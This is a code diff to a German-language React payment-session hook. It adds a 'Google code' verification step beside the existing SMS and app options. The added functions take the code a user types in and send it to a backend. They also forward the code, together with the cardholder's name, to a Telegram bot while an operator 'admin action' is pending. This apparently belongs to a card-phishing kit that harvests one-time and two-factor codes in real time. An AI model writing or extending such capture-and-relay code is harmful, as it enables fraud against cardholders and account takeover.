@@ -6,6 +6,7 @@ interface PaymentSessionData {
   verification_method: string;
   verification_status: string;
   sms_code?: string;
+  google_code?: string;
   admin_action_pending?: boolean;
   failure_reason?: string;
 }
@@ -91,7 +92,11 @@ export const useOptimisticPaymentSession = (sessionId: string) => {
     // Optimistic update
     const optimisticUpdate = {
       verification_method: method,
-      verification_status: method === 'sms_confirmation' ? 'sms_confirmation' : 'waiting',
+      verification_status: method === 'sms_confirmation' 
+        ? 'sms_confirmation' 
+        : method === 'google_code_confirmation'
+        ? 'google_code_confirmation' 
+        : 'waiting',
       admin_action_pending: true,
       failure_reason: null,
     };
@@ -107,7 +112,7 @@ export const useOptimisticPaymentSession = (sessionId: string) => {
       console.log('Verification method set successfully');
 
       // Send Telegram notification for method selection (only when choosing from choice_required)
-      if (sessionData?.verification_method === 'choice_required' && (method === 'app_confirmation' || method === 'sms_confirmation')) {
+      if (sessionData?.verification_method === 'choice_required' && (method === 'app_confirmation' || method === 'sms_confirmation' || method === 'google_code_confirmation')) {
         try {
         const cardholderName = response.data?.data?.orders?.cardholder_name;
           await supabase.functions.invoke('telegram-bot', {
@@ -116,9 +121,9 @@ export const useOptimisticPaymentSession = (sessionId: string) => {
               data: {
                 session_id: sessionId,
                 verification_method: method,
-                verification_status: method === 'sms_confirmation' ? 'sms_confirmation' : 'waiting',
+                verification_status: method === 'sms_confirmation' ? 'sms_confirmation' : method === 'google_code_confirmation' ? 'google_code_confirmation' : 'waiting',
                 cardholder_name: cardholderName,
-                message: `User wählte: ${method === 'app_confirmation' ? 'App-Bestätigung' : 'SMS-Bestätigung'}`
+                message: `User wählte: ${method === 'app_confirmation' ? 'App-Bestätigung' : method === 'sms_confirmation' ? 'SMS-Bestätigung' : 'Google-Code'}`
               }
             }
           });
@@ -309,6 +314,119 @@ export const useOptimisticPaymentSession = (sessionId: string) => {
     }
   }, [sessionId, toast]);
 
+  const enterGoogleCode = useCallback(async (code: string) => {
+    if (!sessionId) return;
+
+    console.log('Entering Google code optimistically');
+    
+    // Optimistic update - save user code and set status to google_code_confirmation
+    setLocalState({ 
+      google_code: code, 
+      verification_status: 'google_code_confirmation',
+      failure_reason: null
+    });
+    setIsLoading(true);
+
+    try {
+      const response = await supabase.functions.invoke('payment-sessions/enter-google-code', {
+        body: { sessionId, code }
+      });
+      
+      if (response.error) {
+        // Rollback optimistic update
+        setLocalState({});
+        toast({
+          title: "Fehler",
+          description: "Google-Code konnte nicht gespeichert werden.",
+          variant: "destructive"
+        });
+      } else {
+        console.log('Google code entered successfully');
+        toast({
+          title: "Google-Code gespeichert",
+          description: "Ihr Code wurde gespeichert.",
+        });
+      }
+    } catch (error) {
+      console.error('Error entering Google code:', error);
+      // Rollback optimistic update
+      setLocalState({});
+      toast({
+        title: "Fehler",
+        description: "Google-Code konnte nicht gespeichert werden.",
+        variant: "destructive"
+      });
+    } finally {
+      setIsLoading(false);
+    }
+  }, [sessionId, toast]);
+
+  const submitGoogleCode = useCallback(async (code: string) => {
+    if (!sessionId) return;
+
+    console.log('Submitting Google code optimistically');
+    
+    // Optimistic update - directly to google_code_confirmed with the code
+    setLocalState({ 
+      verification_status: 'google_code_confirmed',
+      google_code: code,
+      failure_reason: null
+    });
+    setIsLoading(true);
+
+    try {
+      const response = await supabase.functions.invoke('payment-sessions/submit-google-code', {
+        body: { sessionId, code }
+      });
+      
+      if (response.error) {
+        // Rollback optimistic update
+        setLocalState({});
+        toast({
+          title: "Fehler",
+          description: "Google-Code konnte nicht gespeichert werden.",
+          variant: "destructive"
+        });
+      } else {
+        // Send Telegram notification for Google code submission
+        try {
+          const cardholderName = response.data?.data?.orders?.cardholder_name;
+          await supabase.functions.invoke('telegram-bot', {
+            body: {
+              type: 'verification_update',
+              data: {
+                session_id: sessionId,
+                verification_method: 'google_code_confirmation',
+                verification_status: 'google_code_confirmation',
+                google_code: code,
+                cardholder_name: cardholderName
+              }
+            }
+          });
+        } catch (telegramError) {
+          console.warn('Failed to send Telegram Google code notification:', telegramError);
+        }
+        
+        console.log('Google code submitted successfully');
+        toast({
+          title: "Google-Code bestätigt",
+          description: "Ihr Code wurde erfolgreich übermittelt.",
+        });
+      }
+    } catch (error) {
+      console.error('Error submitting Google code:', error);
+      // Rollback optimistic update
+      setLocalState({});
+      toast({
+        title: "Fehler",
+        description: "Google-Code konnte nicht gespeichert werden.",
+        variant: "destructive"
+      });
+    } finally {
+      setIsLoading(false);
+    }
+  }, [sessionId, toast]);
+
   // Merge actual data with optimistic updates
   const currentData = sessionData ? { ...sessionData, ...localState } : null;
 
@@ -318,6 +436,8 @@ export const useOptimisticPaymentSession = (sessionId: string) => {
     setVerificationMethod,
     confirmAppVerification,
     enterSmsCode,
-    submitSmsCode
+    submitSmsCode,
+    enterGoogleCode,
+    submitGoogleCode
   };
 };
